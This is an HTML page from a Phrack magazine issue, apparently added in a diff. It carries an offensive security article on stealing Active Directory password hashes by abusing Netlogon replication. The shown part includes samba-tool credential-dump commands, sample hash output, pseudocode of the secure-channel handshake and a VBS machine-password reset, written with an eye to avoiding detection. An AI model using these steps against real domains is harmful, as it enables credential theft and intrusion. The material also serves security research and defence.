@@ -1,0 +1,1869 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Abusing Netlogon to steal an Active Directory's secrets ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a class="current" href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack68.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack68.tar.gz" title="Get current issue tar.gz">68</a> | <strong>Release date</strong> : <b>2012-04-14</b> | <strong>Editor</strong> : <b>The Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/68/1.html#article">Introduction</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/68/2.html#article">Phrack Prophile on FX</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/68/3.html#article">Phrack World News</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/68/4.html#article">Linenoise</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/68/5.html#article">Loopback</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/68/6.html#article">Android Kernel Rootkit</a></td><td align="right">dong-hoon you</td></tr>
+<tr><td align="left"><a href="../../issues/68/7.html#article">Happy Hacking</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/68/8.html#article">Practical cracking of white-box implementations</a></td><td align="right">sysk</td></tr>
+<tr><td align="left"><a href="../../issues/68/9.html#article">Single Process Parasite</a></td><td align="right">Crossbower</td></tr>
+<tr><td align="left"><a href="../../issues/68/10.html#article">Pseudomonarchia jemallocum</a></td><td align="right">argp &amp; huku</td></tr>
+<tr><td align="left"><a href="../../issues/68/11.html#article">Infecting loadable kernel modules: kernel versions 2.6.x/3.0.x</a></td><td align="right">styx^</td></tr>
+<tr><td align="left"><a href="../../issues/68/12.html#article">The Art of Exploitation: MS IIS 7.5 Remote Heap Overflow</a></td><td align="right">redpantz</td></tr>
+<tr><td align="left"><a href="../../issues/68/13.html#article">The Art of Exploitation: Exploiting VLC, a jemalloc case study</a></td><td align="right">huku &amp; argp</td></tr>
+<tr><td align="left"><a href="../../issues/68/14.html#article">Secure Function Evaluation vs. Deniability in OTR and similar protocols</a></td><td align="right">greg</td></tr>
+<tr><td align="left"><a href="../../issues/68/15.html#article">Similarities for Fun and Profit</a></td><td align="right">Pouik &amp; G0rfi3ld</td></tr>
+<tr><td align="left"><a href="../../issues/68/16.html#article">Lines in the Sand: Which Side Are You On in the Hacker Class War</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/68/17.html#article">Abusing Netlogon to steal an Active Directory's secrets</a></td><td align="right">the p1ckp0ck3t</td></tr>
+<tr><td align="left"><a href="../../issues/68/18.html#article">25 Years of SummerCon</a></td><td align="right">Shmeck</td></tr>
+<tr><td align="left"><a href="../../issues/68/19.html#article">International Scenes</a></td><td align="right">various</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Abusing Netlogon to steal an Active Directory's secrets</div>
+<div class="opt-bottom"> <strong>Author</strong> : the p1ckp0ck3t</div>
+<pre>                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x11 of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-----=[ Abusing Netlogon to steal an Active Directory's secrets ]=-----=|
+|=-----------------------------------------------------------------------=|
+|=-----------------------=[  by the p1ckp0ck3t  ]=-----------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ anonymous_7406da@phrack.org ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+                                  &lt;&lt;&lt;-&gt;&gt;&gt;
+
+  + Prologue
+  + Common tools &amp; appropriate warnings!
+  + Meet the Samba 4 project
+  + Digging into the Netlogon replication mechanism
+  + Extracting the secrets
+  + A practical introduction to S4 (Stealth &amp; Secure Secret Stealer)
+  + S4 .VS. Windows 2008 Domain Controllers
+  + Additional details
+  + Last words
+  + Bibliography
+  + c0de: S4
+
+                                  &lt;&lt;&lt;-&gt;&gt;&gt;
+
+
+---[ 1 - Prologue
+
+
+If you've been hacking around Windows networks then you must be more than
+familiar with common LSA dumping tools such as pwdump [01] &amp; co. You must
+also know that they are not only detected by (most?) AV, but furthermore
+that they may not work the expected way when an AV/HIPS is installed on
+your target. In the worst case a box may even crash! It's fucking annoying.
+
+In a Windows network, crashing a workstation is probably harmless (natural
+Windows behavior you could say) because administrators won't notice and its
+user will only complain. He may also kick the box, blame &quot;fucking M$&quot; and
+ultimately reboot it. But in the end, we all know that he will rather focus
+on the recovery of his Office document than look for evidence (assuming he
+has the required skills to begin with). The situation is entirely different
+when it comes to Windows servers and especially DC (Domain Controllers).
+For these kinds of target, one needs to be *very* cautious because an
+administrator would find a crash *very* suspicious.
+
+This paper presents a (hopefully) new technique to retrieve the AD (Active
+Directory [02])'s secrets using one of its (natural) replication mechanisms
+when a DC or a domain administrator's account has been compromised. Because
+it's solely based on the Windows API -without any hooks or (too) dirty
+tricks- it's a quiet efficient way to retrieve domain users' hashed
+passwords.
+
+
+---[ 2 - Common tools &amp; appropriate warnings!
+
+
+Let me first begin by a bit of bitching regarding what's already available
+out there. There are a lot of tools dealing with &quot;online&quot; password dumping,
+most being open source, a few of them being however commercial software (I
+haven't tested those). Judging from my experience (and that of many
+friends) I can tell you that only a few of them are *really* of interest. I
+won't fill a bug report -:]- but remember that a good password dumping tool
+should provide:
+
+1. Stability:    Using such a tool should *never* be risky for the target's
+                 safety. Interactions with LSASS are really intrusive and
+                 dangerous and should be avoided if possible. You wouldn't
+                 use a kernel sploit without having first understood how
+                 and why it's working right? Same thing here. Crashing
+                 LSASS means crashing the box!
+
+2. Stealthiness: You should never take the risk to be caught by some
+                 AV/HIPS. It's no news that there are Windows APIs that you
+                 can't use anymore and it's obvious that binaries provided
+                 by a famous security website have a good chance to be
+                 detected.
+
+Take for example the case of fgdump &amp; gsecdump. Both are great tools with a
+very good chance to succeed. But, can you seriously trust software that:
+
+    - Hook well known LSASS functions (using even more known techniques)?
+      (pwdump6 of fgdump)
+    - Parse internal LSASS memory? (gsecdump)
+    - Write well known (=&gt; detected) dll &amp; exe files on disk? (fgdump)
+    - Start new services? Stop AV services? (fgdump)
+    - Are closed source? (gsecdump)
+
+Especially with poorly designed AV/HIPS running on the same machine? Don't
+take me wrong, I'm not dissing pwdump* (or the similar) tools especially
+since they are necessary; but at least patch them a bit, you moron! In the
+case of a workstation target, there are no other public alternatives. But
+there's another story in the case of a DC target. What can be done in this
+matter?
+
+Let me tell you the story that months later would lead me to this paper.
+Because it's a story, some details are missing, especially in the reverse
+engineering work performed. The idea is to keep the paper simple, as well
+as to give you the opportunity to find the last pieces of the puzzle all by
+yourself; follow the hints, hacker :]
+
+
+---[ 3 - Meet the spart^wSamba 4 project
+
+
+Unix people are well aware of the Samba project but only a few of them are
+truly aware of how incredible this project really is. This is not just
+about mounting CIFS volumes, but a complete reverse engineering/rewrite of
+several parts of Windows. Kudos to the Samba team.
+
+A few years ago, the Samba team decided to start a new branch of their
+project: Samba 4 [03]. The goal was to provide an even deeper integration
+of a Samba server inside an Active Directory. Now with Samba 4, a Unix
+computer can become a (RO)DC and what's even more incredible is that it's
+as easy (well if you're lucky) as typing:
+
+------------------------------[ screendump ]-------------------------------
+# samba-tool join FOO.BAR DC -Uadministrator@foo.bar --realm=FOO.BAR
+---------------------------------------------------------------------------
+
+This command (dc)promotes our Linux box in the AD (in this case the domain
+is foo.bar). It's easy to check that it's indeed properly registered as a
+legitimate DC using for example an LDAP query:
+
+------------------------------[ screendump ]-------------------------------
+$ ldapsearch -x -LLL -h dc1.foo.bar -D &quot;administrator@foo.bar&quot; -W -b
+&quot;OU=Domain Controllers,dc=foo,dc=bar&quot; &quot;(objectClass=Computer)&quot; cn
+Enter LDAP Password: *******
+dn: CN=DC1,OU=Domain Controllers,DC=foo,DC=bar
+cn: DC1               &lt;-- first DC
+
+dn: CN=MEDIA,OU=Domain Controllers,DC=foo,DC=bar
+cn: MEDIA             &lt;-- second DC = our proud little Linux
+---------------------------------------------------------------------------
+
+As all traditional DC functions are properly running, Kerberos services are
+running as well to authenticate domain users whenever it is required:
+
+------------------------------[ screendump ]-------------------------------
+# samba-tool samdump
+[...]
+Administrator:500:BAC14D04669EE1D1AAD3B435B51404EE:\
+                  FBBF55D0EF0E34D39593F55C5F2CA5F2:[UX]:LCT-4F1B2611
+Guest:501:NO PASSWORDXXXXXXXXXXXXXXXXXXXXX:\
+          NO PASSWORDXXXXXXXXXXXXXXXXXXXXX:[NDUX]:LCT-00000000
+krbtgt:502:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+           D25E142705B3C1B9122309D194E0B36F:[DU]:LCT-4F1B1EFC
+SUPPORT_388945a0:1001:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+                      4CB5D040611B3FF00F17AF7DC344F97C:[DUX]:LCT-4F1B196F
+DC1$:1003:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+          A59B7CDD1167816DFDD8C5F310ACCEC0:[S]:LCT-4F1B1F2F
+tofu:1117:E91851A7E394D006ABD3B435B31404EE:\
+          15221599C25FA333EA6044C0513ADD45:[UX]:LCT-4F1B23FB
+HAXOR$:1120:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+            88369D133A118783D46D1C6344E99B08:[W]:LCT-4F1B366B
+cheese:1121:BC5F4D08D49A0099AAD3B43CB51404EE:\
+            3E21E05DD9E4E790CB3783D9292F80F7:[UX]:LCT-4F1BE1F2
+MEDIA$:1122:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+            72CCE806701E837DCBB33B29A9D48E97:[S]:LCT-4F1C3AB1
+[...]
+---------------------------------------------------------------------------
+
+When I discovered how mature the Samba 4 project had become and what it
+allowed me to perform, I started to imagine how I could take advantage of
+the situation. The first idea I came up with was to introduce a temporary
+Samba 4 DC in the AD infrastructure, dump the passwords and immediately
+dcpromote it again (=remove it from the AD). However this idea is really
+bad regarding the criteria that I gave earlier:
+
+    - Stability: No matter how functional Samba 4 may appear, it's many
+      years too soon to use it for serious purpose. To give you an example,
+      I destroyed many testing environments as I was playing with Samba 4
+      (merely using it in fact).
+
+    - Stealthiness: I doubt there is even one person able to tell us how
+      many modifications the introduction of a new DC would bring in the
+      AD. Do you honestly think that you could introduce a DC, make it
+      disappear and that no administrator would ever be able to tell that
+      it was there? I'm not taking the risk and neither should you.
+
+For these two reasons, it was wise to resign (interestingly, as I would be
+told later, some French guy apparently didn't [04]).
+
+At this point, I had no more ideas until I realized that network traffic
+was exchanged between DC1 (another DC from the domain) and MEDIA when I was
+typing the samdump command. More precisely, and thanks to Wireshark's
+dissectors (courtesy of the Samba team), I was able to observe the
+following events:
+
+    1. NTLM Authentication Protocol used to authenticate MEDIA
+    2. MEDIA binding on \\DC3.FOO.BAR\IPC$\lsarpc and calling
+           -&gt; lsa_OpenPolicy2()       (opnum 44)
+           -&gt; lsa_QueryInfoPolicy2    (opnum 46)
+    3. MEDIA binding on \\DC3.FOO.BAR\IPC$\netlogon and calling
+           -&gt; NetrServerReqChallenge  (opnum 4)
+           -&gt; NetrServerAuthenticate2 (opnum 15)
+    4. MEDIA binding again (*) on \\DC3.FOO.BAR\IPC$\netlogon and calling
+           -&gt; NetrDatabaseSync        (opnum 8)
+           -&gt; NetrDatabaseSync        (opnum 8)
+           -&gt; NetrDatabaseSync        (opnum 8)
+
+(* Using 2 different binds in step 3 &amp; 4 seems weird at first but it will
+be explained later.)
+
+I was immediately interested in the NetrDatabaseSync() function and googled
+a bit to see if I could find some documentation. Fortunately, Microsoft
+documents this function; it is a wrapper of NetrDatabaseSync2() [05].
+
+-----------------------[ MS official documentation ]-----------------------
+NTSTATUS NetrDatabaseSync2(
+  [in, string] LOGONSRV_HANDLE PrimaryName,
+  [in, string] wchar_t* ComputerName,
+  [in] PNETLOGON_AUTHENTICATOR Authenticator,
+  [in, out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+  [in] DWORD DatabaseID,
+  [in] SYNC_STATE RestartState,
+  [in, out] unsigned long* SyncContext,
+  [out] PNETLOGON_DELTA_ENUM_ARRAY* DeltaArray,
+  [in] DWORD PreferredMaximumLength
+);
+[...]
+The NetrDatabaseSync2 method returns a set of all changes applied to the
+specified database since its creation. It provides an interface for a BDC
+to fully synchronize its databases to those of the PDC.
+[...]
+---------------------------------------------------------------------------
+
+So, it seemed safe to assume that the network traffic observed was the
+consequence of a synchronization mechanism. If you're familiar with Windows
+networks then there is something that should immediately draw your
+attention: the documentation is mentioning PDC (Primary Domain Controller)
+&amp; BDC (Backup Domain Controller) which are pre-Windows2000 (= NT4)
+concepts. Indeed, Windows 2000 introduced Active Directory which uses a
+different logic. Wikipedia [06] explains it perfectly:
+
+-----------------[ Wikipedia: Primary Domain Controller ]------------------
+In later releases of Windows, domains have been supplemented by the use of
+Active Directory services. In Active Directory domains, the concept of
+primary and secondary domain controller relationships no longer applies.
+Primary domain controller emulators hold the accounts databases and
+administrative tools. [...] The same rules apply; only one PDC may exist on
+a domain, but multiple replication servers may still be used.
+---------------------------------------------------------------------------
+
+Note: &quot;later releases&quot; means Windows 2000 or above.
+
+So I came up with the conclusion that Samba 4 was (and still is) using an
+old -now emulated- mechanism to synchronize the AD database between its
+DCs. More precisely in Active Directory, a unique DC holds the PDC FSMO
+role [12], the other DCs being (emulated) BDC as a result. Now pay
+attention to the &quot;DatabaseID&quot; parameter passed to NetrDatabaseSync2():
+
+-----------------------[ MS official documentation ]-----------------------
+DatabaseID: The identifier for a specific database for which the changes
+are requested. It MUST be one of the following values.
+
+    Value                       Meaning
+    -----                       -------
+
+    0x00000000                  Indicates the SAM database.
+    0x00000001                  Indicates the SAM built-in database.
+    0x00000002                  Indicates the LSA database.
+---------------------------------------------------------------------------
+
+Assuming an attacker could call NetrDatabaseSync2() with DatabaseID=0 from
+an (emulated) BDC (= a compromised DC), then he would likely be able to
+retrieve the user database (SAM), which should include hashed passwords as
+well, right?
+
+I was very suspicious at first because the documentation wasn't mentioning
+anything about the LSA queries and lsa_QueryInfoPolicy2() is still
+currently undocumented (afaik). I was afraid that this would complicate
+things. I could have started to dig inside Samba 4's code (which is quite
+messy unfortunately) but I had instead a much better idea. What if this API
+was implemented in some native program available with Windows Server?
+
+Guess the answer.
+
+
+---[ 4 - Digging into the Netlogon replication mechanism
+
+
+If you're familiar with Windows sysadmin stuff then you must be well aware
+of the &quot;Remote Server Administration Tools&quot; [07] which provides a set of
+useful new commands for the CLI, including the one I was looking for:
+nltest.exe (now native under Windows 2008 FYI).
+
+Here is how Microsoft describes the tool:
+
+-----------------------[ MS official documentation ]-----------------------
+You can use nltest to:
+
+    Get a list of domain controllers
+
+    Force a remote shutdown
+
+    Query the status of trust
+
+    Test trust relationships and the state of domain controller replication
+    in a Windows domain
+
+    Force a user-account database to synchronize on Windows NT version 4.0
+    or earlier domain controllers      &lt;-- synchronize + NT4 == JACKPOT?
+---------------------------------------------------------------------------
+
+The last sentence is interesting, right?
+
+Looking at the IAT of nltest.exe (for Windows 2003), I saw that there were
+entries for I_NetServerReqChallenge(), I_NetServerAuthenticate() and
+I_NetDatabaseSync(), all of them being imported from NETAPI32.dll and
+(strangely) undocumented.
+
+A short look at them convinced me that they were mere wrappers for RPC
+calls to (respectively) NetrServerReqChallenge(), NetrServerAuthenticate()
+and NetrDatabaseSync() located in netlogon.dll and obviously called using a
+binding to the named pipe \\%COMPUTERNAME%\IPC$\netlogon. What's cool with
+these functions is that they _are_ documented in [08] and a tiny
+modification apart, their prototypes match those of their NETAPI32.dll
+cousins.
+
+To make things even easier, I observed that all our targeted functions were
+called inside one big function, arbitrarily called SyncFunction() from now
+on. Reversing SyncFunction() was a task which proved to be really easy
+thanks to Microsoft's API documentation.
+
+Assuming DC2 requests a synchronization from its PDC (DC1), this gives the
+approximate pseudo-code (I omitted details about the assembly for
+clarification purposes, but you can find them in the uuencoded C code at
+the end of the article):
+
+-----------------------------[ SyncFunction() ]----------------------------
+
+    # Step 1:
+    # ClientChallenge is an 8 bytes array randomly chosen
+
+    RANDOM(ClientChallenge);
+
+    # Step 2:
+    # DC2 sends its challenge and requests one (also an 8 bytes array)
+    # from DC1
+
+    ZERO(ServerChallenge);
+    I_NetReqChallengeFunc(
+        (WCHAR) L&quot;\\\\&quot; + DC1_FQDN,
+        (WCHAR) DC2_HOSTNAME,
+        ClientChallenge,
+        [OUT] ServerChallenge);
+
+    # Step 3:
+    # The client creates a Unicode object out of its machine account name
+    # (suffix is '$') and hashes it using SystemFunction007() which is an
+    # MD4()
+    # The resulting hash (NTLM) is an 8 bytes array: MD4_HASH
+
+    UnicodeString(ComputerName, &quot;DC2$&quot;)
+    ZERO(MD4_HASH);
+    SystemFunction007((UnicodeString)ComputerName, MD4_HASH);
+
+    # Step 4:
+    # To authenticate itself, the client will need to compute a new
+    # challenge (NewClientChallenge).
+    # To do so, the client builds a DES key (SessionKey) using the two
+    # challenges and the previously computed hash.
+
+    ZERO(SessionKey, 16);
+    NlMakeSessionKey(
+        MD4_HASH,
+        ClientChallenge,
+        ServerChallenge,
+        [OUT] SessionKey);
+
+    # Step 5:
+    # The client computes NewClientChallenge using SessionKey.
+
+    Encrypt000(
+        ClientChallenge,
+        [OUT] NewClientChallenge,
+        SessionKey);
+
+    # Step 6:
+    # The client sends NewClientChallenge to authenticate itself.
+    # If the answer is the correct one, the server will acknowledge
+    # the identity of the client and gives him back his own challenge
+    # (NewServerChallenge)
+
+    ZERO(NewServerChallenge);
+    I_NetServerAuthenticate(
+        (WCHAR) L&quot;\\\\&quot; + DC1_FQDN,
+        L&quot;DC2$&quot;,                # DC2's machine account name
+        ServerSecureChannel = 6,
+        (WCHAR) L&quot;DC2&quot;,         # DC2's hostname
+        NewClientChallenge,
+        [OUT] NewServerChallenge,
+        NegotiateFlags);
+
+    # Step 7:
+    # The client needs to know that he can trust the server so the
+    # authentication has to be _mutual_. Imagine if a rogue DC was sending
+    # a false SAM, this would allow an attacker to authenticate himself on
+    # DC2 using spoofed credentials.
+    #
+    # To check the identity of the server, NewServerChallenge must have
+    # been calculated using ServerChallenge and SessionKey which is common
+    # to DC1 and DC2.
+
+    Encrypt000(
+        ServerChallenge,
+        [OUT] ExpectedKey,
+        SessionKey);
+
+    if( NewServerChallenge != ExpectedKey )
+    {
+        exit(1);
+    }
+
+    # Step 8:
+    # For each type of database (DatabaseID), DC2 computes a new challenge
+    # which is stored in Authenticator and retrieves the database object
+    # DeltaArray. After each call, the client checks the authenticity of
+    # the data returned.
+
+    for(DatabaseID=0; DatabaseID&lt;3; DatabaseID++)
+    {
+        NlBuildAuthenticator(
+            NewClientChallenge,
+            SessionKey,
+            [OUT] Authenticator);
+
+        ZERO(ReturnAuthenticator);
+        I_NetDatabaseSync(
+            (WCHAR) L&quot;\\\\&quot; + DC1_FQDN,
+            (WCHAR) DC2_HOSTNAME,
+            Authenticator,
+            ReturnAuthenticator,
+            DatabaseID,
+            SyncContext=0,
+            [OUT] DeltaArray,
+            -1);
+
+        if( NlUpdateSeed(
+                NewClientChallenge,
+                ReturnAuthenticator,
+                SessionKey) == 0 )
+        {
+            exit(1);
+        }
+    }
+---------------------------------------------------------------------------
+
+With the additional functions:
+
+-----------------------------[ subfunctions ]------------------------------
+
+# This function uses the 14 first bytes of SessionKey to compute
+# a new challenge out of an old one. Both challenges are 8 bytes
+# arrays.
+#
+# new = DES(DES(old))
+
+
+Encrypt000(
+    ClientChallenge,
+    NewChallenge,
+    SessionKey)
+{
+    BYTE TempOutput[8];
+
+    ZERO(NewChallenge);
+    SystemFunction001(ClientChallenge, SessionKey[0..6], TempOutput);
+    SystemFunction001(TempOutput, SessionKey[7..13], NewChallenge);
+
+    # TempOutput = DES(in=ClientChallenge, k=SessionKey[0..6])
+    # NewChallenge = DES(in=TempOutput, k=SessionKey[7..13])
+}
+
+                                    ---
+
+# The SessionKey is calculated using a combination of ClientChallenge
+# and ServerChallenge (to avoid replay attacks I believe).
+# Because client &amp; server both know the MD4 value (a shared key between
+# them), they both can compute safely the SessionKey, but an attacker
+# without this knowledge will be unable to.
+
+NlMakeSessionKey(
+    MD4,
+    ClientChallenge,
+    ServerChallenge,
+    SessionKey)
+{
+    BYTE TempOut[8];
+
+    ZERO(SessionKey)
+    SessionKey[0..3] = ClientChallenge[0..3] + ServerChallenge[0..3];
+    SessionKey[4..7] = ClientChallenge[4..7] + ServerChallenge[4..7];
+
+    SystemFunction001(SessionKey[0..7], MD4[0..6], TempOut);
+    SystemFunction001(TempOut, MD4[9..15], SessionKey);
+
+    # TempOut = DES(SessionKey[0..7], MD4[0..6])
+    # SessionKey = DES(TempOut, MD4[9..15])
+}
+
+                                    ---
+
+# This function builds the Authenticator necessary for each
+# *DatabaseSync() call. The authenticator includes a Timestamp which is
+# used in the computation of the new Challenge.
+
+NlBuildAuthenticator(
+    NewClientChallenge,
+    SessionKey,
+    Authenticator
+    )
+{
+    FILETIME Time;
+    ZERO(Authenticator);
+    GetSystemTimeAsFileTime(Time);
+    RtlTimeToSecondsSince1970(
+        Time,
+        Authenticator-&gt;Timestamp);
+    NewClientChallenge[0..3] += Authenticator-&gt;Timestamp;
+    Encrypt000(
+        NewClientChallenge,
+        Authenticator-&gt;Credential,
+        SessionKey);
+}
+
+                                    ---
+
+# The server is supposed to acknowledge securely the request.
+# This function checks that the acknowledgment is indeed from
+# the server and not from some rogue DC.
+
+NlUpdateSeed(
+    NewClientChallenge,
+    ReturnAuthenticator,
+    SessionKey
+    )
+{
+    BYTE TempOut[8];
+
+    NewClientChallenge[0]++;
+    Encrypt000(
+        NewClientChallenge,
+        TempOut,
+        SessionKey);
+
+    if( ReturnAuthenticator-&gt;Credential == TempOut )
+        return 1;
+
+    return 0;
+}
+---------------------------------------------------------------------------
+
+Let's put aside the usual Microsoft crypto weirdness of the protocol
+because this is not the subject of this article. In a nutshell:
+
+    - The client (BDC) and the server (PDC) both compute a session key
+      using random challenges (to avoid replay attacks) and a 'secret' MD4
+      key.
+    - Once a trusted bond between them is established, the server sends
+      several objects (of type DeltaArray) which should contain the
+      expected secrets. The trusted bond is called a 'secure channel' in
+      Microsoft's documentation.
+    - To avoid man-in-middle attempts, the exchanges are somehow
+      authenticated using the session key (which has another purpose, but
+      that's another story my friends).
+
+Now, if you have been attentive you may have realized that I never
+mentioned any LSA related functions (remember lsarpc bind?) and that the
+session key would be really easy to deduce for a passive observer (sniffer)
+because the shared secret (%BDC_NAME% + &quot;$&quot;) is predictable. And indeed, it
+didn't work when I first tested the code built upon the reverse engineering
+process. I_NetServerAuthenticate() kicked me out with the classical &quot;Access
+Denied&quot; message.
+
+So what went wrong? I was almost sure that the lsa_() functions were not
+necessary because they are not used in nltest.exe. So this led me to think
+that somehow NewClientChallenge wasn't correct. Assuming the algorithm was
+well reversed, the session key produced by NlMakeSessionKey() had to be
+erroneous. Strange? Not quite. Remember that the MD4 key is somehow weird.
+Even considering Microsoft's past, it was hard to believe that they would
+base the security of their protocol on such a value. And indeed they aren't
+that crazy! Using the appropriate hook in LSASS, I found out that this MD4
+was in fact the client's computer account hash (NTLM)! A result that I
+would later find almost everywhere whenever looking for some information on
+the so-called 'secure channel'. Sometimes you just have to keep looking...
+
+The problem is that retrieving the BDC's computer account NTLM is
+(probably) as hard as retrieving the whole SAM itself. So how do we deal
+with the Ouroboros? The solution is actually quite simple: we may not know
+the NTLM hash, but we can easily change it! Look at this nice piece of 
+code:
+
+-------------------------------[ passwd.vbs ]------------------------------
+Dim objComputer
+
+Set objComputer = GetObject(&quot;WinNT://foo.bar/DC2$&quot;)
+objComputer.SetPassword &quot;dummy&quot;
+
+Wscript.Quit
+---------------------------------------------------------------------------
+
